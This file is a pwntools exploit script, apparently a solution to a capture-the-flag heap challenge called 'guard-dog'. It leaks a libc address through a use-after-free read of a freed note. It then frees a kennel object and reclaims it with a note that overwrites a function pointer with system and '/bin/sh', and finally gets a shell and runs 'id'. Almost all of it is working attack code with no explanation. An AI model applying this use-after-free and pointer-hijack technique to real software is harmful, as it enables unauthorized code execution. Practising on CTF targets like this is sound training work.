from pwn import *
context.log_level='error'
libc = ELF('./libc-2.31.so')

io = process(['./ld-2.31.so','--library-path','.','./guard-dog'])

def adopt(name):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'kennel (0-7): ', b'0')
    io.sendafter(b'name: ', name)

def command(i):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'kennel: ', str(i).encode())

def release(i):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'kennel: ', str(i).encode())

def file_note(slot, size, data):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'note slot (0-7): ', str(slot).encode())
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'contents: ', data)

def read_note(slot):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'note slot: ', str(slot).encode())
    return io.recvuntil(b'\n', drop=False)

def shred(slot):
    io.sendlineafter(b'> ', b'6')
    io.sendlineafter(b'note slot: ', str(slot).encode())

# Phase 1: leak
file_note(0, 0x500, b'AAAA')
shred(0)
data = read_note(0)
print("leak raw:", data[:16].hex())
leak = u64(data[:8])
print("leak:", hex(leak))
base = leak - 0x1ecbe0
print("libc base:", hex(base))
libc.address = base
print("system:", hex(libc.sym['system']), "binsh:", hex(next(libc.search(b'/bin/sh'))))

# Phase 2
adopt(b'Y'*23)
release(0)
payload = b'/bin/sh\x00' + b'B'*0x10 + p64(libc.sym['system'])
file_note(1, 0x28, payload)
command(0)
io.sendline(b'echo PWNED; id; exit')
print(io.recvall(timeout=5).decode(errors='replace'))
EOF
